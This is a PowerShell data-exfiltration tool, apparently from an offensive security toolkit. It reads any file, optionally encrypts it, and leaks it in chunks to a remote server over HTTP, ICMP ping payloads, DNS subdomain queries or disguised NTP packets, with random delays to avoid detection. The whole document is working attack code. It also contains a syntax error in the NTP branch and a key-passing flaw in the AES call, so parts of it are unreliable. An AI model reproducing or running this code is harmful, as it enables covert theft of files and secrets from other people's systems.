function Invoke-Exfiltration {
    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep)
    $data = [System.IO.File]::ReadAllBytes($file)
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($data))
    $hash = $hash -replace '-','';
    
    If ($key) {
        $data = AES $data 
    }

    $string = [System.BitConverter]::ToString($data);
    $string = $string -replace '-','';
    $filename = Split-Path $file -leaf
    $len = $string.Length;

    If ($type -eq 'dns') {
	#$split = 66 - $len.Length - $dns.Length;
	$split = 50
    }
    ElseIf {$type -eq 'ntp') {
	$split = 20
    }
    Else {
	$split = Get-Random -minimum 150 -maximum 500;
    }

    $id = 0
    If ($type -eq 'ntp') {
	$repeat=[Math]::Ceiling($len/$split);
    }
    Else {
	$repeat=[Math]::Floor($len/$split);
    }

    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    
    If ($type -eq 'ntp') {
	$register1 = 'REG-' + $jobid + '|!|' + $filename + '|!|REGISTER|!|'
        $register2 = 'REG-' + $hash
    }
    Else {
	$data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    }

    # Determine exfiltration type and send data
    If ($type -eq 'ALL') {
      
        $IE = new-object -com internetexplorer.application;
        $q = Send-ICMPPacket $data

        for($i=0; $i-lt($repeat); $i++){
            
            $str = $string.Substring($i * $Split, $Split);
            $sender = Get-Random -minimum 1 -maximum 4;
        
            If ($sender -eq '1') {
                $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
                $q = Send-ICMPPacket $data
            }
            If ($sender -eq '2') {
                $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
                $q = Send-HTTPRequest $data $IE
            }
            If ($sender -eq '3') {
                $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
                $q = Send-DNSRequest $server $data $jobid
            }
        }
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $sender = Get-Random -minimum 1 -maximum 3;

            If ($sender -eq '1') {
                $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
                $q = Send-ICMPPacket $data
            }
            If ($sender -eq '2') {
                $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
                $q = Send-HTTPRequest $data $IE
            }
            $i++
        }
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-ICMPPacket $data
    }
    ElseIf ($type -eq 'DNS') {
        $q = Send-DNSRequest $server $data $jobid
        for($i=0; $i-lt($repeat); $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
            $q = Send-DNSRequest $server $data $jobid
        }
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
            $q = Send-DNSRequest $server $data $jobid
            $i++
        }
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-DNSRequest $server $data $jobid
    }
    ElseIf ($type -eq 'HTTP') {
        $IE = new-object -com internetexplorer.application;
        $q = Send-HTTPRequest $data $IE
        for($i=0; $i-lt$repeat; $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
            $q = Send-HTTPRequest $data $IE
        }
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
            $q = Send-HTTPRequest $data $IE
            $i++
        }
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-HTTPRequest $data $IE
    }
    ElseIf ($type -eq 'ICMP') {
        $q = Send-ICMPPacket $data
        for($i=0; $i-lt($repeat); $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
            $q = Send-ICMPPacket $data
        }
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
            $q = Send-ICMPPacket $data
            $i++
        }
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-ICMPPacket $data
    }
    ElseIf ($type -eq 'NTP') {
        $q = Send-NTPPacket $register1
        $q = Send-NTPPacket $register2
        for($i=0; $i-lt($repeat-1); $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + 'N' + '|!|' + $str
            $q = Send-NTPPacket $data
        };
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $i = $i +1
            $data = $jobid + '|!|' + $i + '|!|' + 'N' + '|!|' + $str
            $q = Send-NTPPacket $data
        };
    
        $i = $i + 1
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-NTPPacket $data
    }
}

function Send-HTTPRequest {
    param ([string] $data, [System.__ComObject] $IE)
    $url = "http://" + $server + ":" + $port + "/";
    $data = Base64 $data;
    $IE.navigate2($url+$data)
    If (!$sleep) {
        $sleep = Get-Random -minimum 0 -maximum 8; 
    }
    Start-Sleep -s $sleep;
}

function Send-ICMPPacket {
    param ([string] $data)
    $data = Base64 $data;
    $IPAddress = $server 
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    If (!$sleep) {
        $sleep = Get-Random -minimum 0 -maximum 8; 
    }
    Start-Sleep -s $sleep;
}

function Send-DNSRequest {
    param ([string] $server, [string] $data, [string] $jobid)
    $data = Convert-ToCHexString $data  
    $len = $data.Length;
    $split = 66 - $len.Length - $dns.Length;
    # get the size of the file and split it
    $repeat=[Math]::Floor($len/$split);
    $remainder=$len%$split;

    for($i=0; $i-lt($repeat); $i++){
        $str = $data.Substring($i*$Split,$Split);
        $str = $jobid + $str + '.' + $dns;
        $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
    }
    if($remainder){
        $str = $data.Substring($len-$remainder);
        $str = $jobid + $str + '.' + $dns;
        $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
    }
    If (!$sleep) {
        $sleep = Get-Random -minimum 0 -maximum 8; 
    }
    Start-Sleep -s $sleep;
}

function Send-NTPPacket {
    param ([string] $data)
    [Byte[]]$NtpData = ,0 * 48
    $NtpData[0] = 0x1B    # NTP Request header in first byte
    $NtpData[47] = 0x1B

    for ($i=0;$i-lt 46; $i++) {
        $NtpData[$i+1] = $data[$i]
    }
    #$Server = $server

    $Socket = New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,
                                            [Net.Sockets.SocketType]::Dgram,
                                            [Net.Sockets.ProtocolType]::Udp)
    $Socket.SendTimeOut = 2000  # ms
    $Socket.ReceiveTimeOut = 2000   # ms

    Try {
        $Socket.Connect($server,123)
    }
    Catch {
        Write-Error "Failed to connect to server $server"
        Throw 
    }

    $t1 = Get-Date    # t1, Start time of transaction... 
    
    Try {
        [Void]$Socket.Send($NtpData)
    }
    Catch {
        Write-Error "Failed to communicate with server $server"
        Throw
    }

    $t4 = Get-Date    # End of NTP transaction time

    $Socket.Shutdown("Both") 
    $Socket.Close()
}
  
function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function AES {
    param ([byte[]] $data)
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
	$AES.Padding = "PKCS7"
    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
    $IV = new-object "System.Byte[]" 16
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $RNGCrypto.GetBytes($IV)
    $AES.IV = $IV

    $Encryptor = $AES.CreateEncryptor()

    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
}

function Convert-ToCHexString {
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}
